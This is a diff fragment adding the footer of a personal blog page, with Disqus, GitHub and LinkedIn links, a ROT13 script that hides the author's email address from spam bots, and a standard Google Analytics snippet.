+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+                <li><a href="http://www.wryway.com/blog/">Blog</a></li>
+            <li><a href="https://github.com/reider-roque">Github</h3>
+            </a></li>
+            <li><a href="https://linkedin.com/in/olegmi">Linkedin</h3>
+            </a></li>
+    <script type="text/javascript">
+        // JS ROT13 by http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/
+        document.write( "<yv><n uers=\"znvygb:byrt@jeljnl.pbz\" ery=\"absbyybj\">Rznvy</n></yv>".replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
+    </script>
+    </ul>
+
+    <p class="disclaimer">
+    Oleg Mitrofanov &copy; 2015
+    </p>
+</footer>
+            </div>
+<script>
+    var _gaq=[['_setAccount','UA-68669065-1'],['_trackPageview']];
+    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+    s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+    </body>
+</html>
